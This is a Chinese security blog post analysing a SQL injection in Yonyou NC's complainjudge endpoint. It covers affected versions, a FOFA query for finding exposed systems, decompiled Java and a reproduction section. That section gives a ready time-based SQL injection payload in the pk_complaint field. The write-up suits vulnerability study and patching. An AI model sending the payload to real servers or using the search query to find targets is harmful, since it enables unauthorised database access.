---
title: "用友NC complainjudge SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-advorappcoll-complainjudge-pk_complaint-sqli.html
asset_dir: assets/用友nc-complainjudge-sql注入漏洞
---

# 用友NC complainjudge SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/28 08:38
- 945浏览
- [0评论](#comment)
- 1小时阅读

深入探索

JSON处理工具

安全研究报告

漏洞扫描服务

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用 /ebvp/advorappcoll/complainbilldetail 和 complainjudge 接口的pk\_complaint参数实现[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，从而窃取服务器的敏感信息。

SQL注入防护

# 影响版本

NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

根据官方漏洞通告可知SQL注入点在 advorappcoll 下的complainbilldetail和complainjudge接口

[![用友NC complainjudge SQL注入漏洞](images/img-001-9a7048c88882.webp)](https://image.mrxn.net/a12b05e732224bf4a7b847d3620d41fa.webp)

因此直接搜索 advorappcoll 下的 complainbilldetail 或者 complainjudge 方法定义即可找到对应的实现逻辑

代码安全审计

深入探索

Windows安全工具

传输层安全性协议

编程语言教程

```
package nc.bs.ebvp.adviceorappeal;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.bs.ebvp.adviceorappeal.form.ComplFormVoUtils;
import nc.bs.ebvp.adviceorappeal.form.ComplaintForm;
import nc.bs.ebvp.adviceorappeal.form.QryConditionComplForm;
import nc.bs.ebvppub.ebvpservicefactory.NCLocatorFactory;
import nc.bs.ebvppub.pubcoll.DefaultEbvpPubController;
import nc.bs.ebvppub.tools.DefualtPageBarInfo;
import nc.bs.ebvppub.tools.LoginContext;
import nc.itf.ebvp.adviceorappeal.service.IAppealQueryService;
import nc.itf.ebvp.adviceorappeal.service.IAppealService;
import nc.vo.ebvp.adviceorappeal.pojo.AggComplaintPOJO;
import nc.vo.ebvp.adviceorappeal.pojo.ComplaintBasePagePOJO;
import nc.vo.ebvp.adviceorappeal.pojo.ComplaintPOJO;
import nc.vo.ebvp.adviceorappeal.pojo.ComplaintPortalReplyPOJO;
import nc.vo.ebvp.adviceorappeal.pojo.ComplaintTypeViewPOJO;
import nc.vo.ebvp.adviceorappeal.pojo.QryConditionComplPOJO;
import nc.vo.ecpubapp.pattern.data.DefaultPageInfo;
import nc.vo.ecpubapp.tools.ReturnObject;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.BusinessException;
import nc.vo.pub.lang.UFDate;
import nc.vo.sm.UserVO;
import org.apache.commons.lang.StringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class AppealrespController extends DefaultEbvpPubController {
    public AppealrespController() {
    }

    private IAppealService getAppealService() {
        return (IAppealService)NCLocatorFactory.getInstance().getEbvpNCLocator().lookup(IAppealService.class);
    }

    private IAppealQueryService getAppealQueryService() {
        return (IAppealQueryService)NCLocatorFactory.getInstance().getEbvpNCLocator().lookup(IAppealQueryService.class);
    }

@ResponseBody
@RequestMapping(
    value = {"/complainjudge"},
    method = {RequestMethod.POST}
)
public String complainjudge(HttpServletRequest request, HttpServletResponse response) throws Exception {
    String pk = request.getParameter("pk_complaint");
    Integer judgeNum = this.getAppealQueryService().judgeComplaintByPk(pk);
    return judgeNum == null ? "" : judgeNum.toString();
}

@RequestMapping(
    value = {"/complainbilldetail"},
    method = {RequestMethod.GET}
)
public String complaindetail(HttpServletRequest request, HttpServletResponse response) throws Exception {
    request.setAttribute("help_html", "TSXY.html");
    String pk = request.getParameter("pk_complaint");
    String qryorresp = request.getParameter("s");
    int cpltType = 0;
    String complainoradvis = request.getParameter("complainoradvis");
    String forWard = "purother/appealresp/appealdetail";
    AggComplaintPOJO aggComplaintPOJO = this.getAppealQueryService().queryComplaintVOByPk(pk, qryorresp);
    if (null != aggComplaintPOJO) {
        ComplaintPOJO complaintVO = (ComplaintPOJO)aggComplaintPOJO.getParentVO();
        cpltType = Integer.parseInt(complaintVO.getFcplttype());
    }

    if (0 == cpltType || 1 == cpltType) {
        int cpltTypeorlook = 0;
        if (null != complainoradvis) {
            cpltTypeorlook = Integer.parseInt(complainoradvis);
        }

        if (0 == cpltType) {
            request.setAttribute("help_html", "JYXY.html");
            if (0 == cpltTypeorlook) {
                forWard = "purother/adviceresp/advicedetail";
            } else {
                forWard = "purother/adviceresp/advicelook";
            }
        }

        if (1 == cpltType) {
            request.setAttribute("help_html", "TSXY.html");
            if (0 == cpltTypeorlook) {
                forWard = "purother/appealresp/appealdetail";
            } else {
                forWard = "purother/appealresp/appeallook";
            }
        }
    }

    if (null != aggComplaintPOJO) {
        this.aggappeal2Form(request, aggComplaintPOJO);
    }

    return forWard;
}
```

进入 getComplaintService().queryComplaintVOByPk 函数后再代入 queryComplaintVOByPk 函数查询

漏洞预警服务

```
public AggComplaintVO queryComplaintVOByPk(String pk) throws BusinessException {
    if (null != pk && !pk.trim().equals("")) {
        BillQuery<AggComplaintVO> bQu = new BillQuery(AggComplaintVO.class);
        AggComplaintVO[] retVO = (AggComplaintVO[])bQu.query(new String[]{pk});
        return SRMBaseUtil.isArrayElementsNull(retVO) ? null : retVO[0];
    } else {
        return null;
    }
}
```

bQu.query 实现如下，主要是组装SQL语句

```
public E[] query(String[] keys) {
    if (keys.length == 0) {
        return (E[])(Constructor.construct(this.billClass, 0));
    } else {
        TimeLog.logStart();
        TableIDQueryCondition conditionBuilder = new TableIDQueryCondition(keys);
        TimeLog.info("构造查询条件");
        TimeLog.logStart();
        IVOMeta parent = this.billMeta.getParent();
        Class<? extends ISuperVO> parentClass = this.billMeta.getVOClass(parent);
        ISuperVO[] vos = this.query(parentClass, parent.getPrimaryAttribute(), conditionBuilder);
        this.composite.append(parent, vos);
        TimeLog.info("查询表头VO");
        TimeLog.logStart();
        this.queryChild(vos, conditionBuilder, parent.getPrimaryAttribute());
        TimeLog.info("查询表体VO");
        TimeLog.logStart();
        E[] bills = this.composite.composite();
        E[] returnbills = this.setLoadedFlag(keys, bills);
        TimeLog.info("组织为单据VO");
        return returnbills;
    }
}
```

最终直接也调用 `executeQuery` 执行上面组合后的SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")利用只能是post，需要注意，可参考上面的漏洞分析部分。

SQL注入防护

```
POST /ebvp/advorappcoll/complainjudge HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: nc.mrxn.net

pageId=login&pk_complaint=1';WAITFOR DELAY'0:0:5'--
```

[![用友NC complainjudge SQL注入漏洞](images/img-002-ddbf55c7e82f.webp)](https://image.mrxn.net/c6451f89b14f47979fce5994d0c7721d.webp)

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=585`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
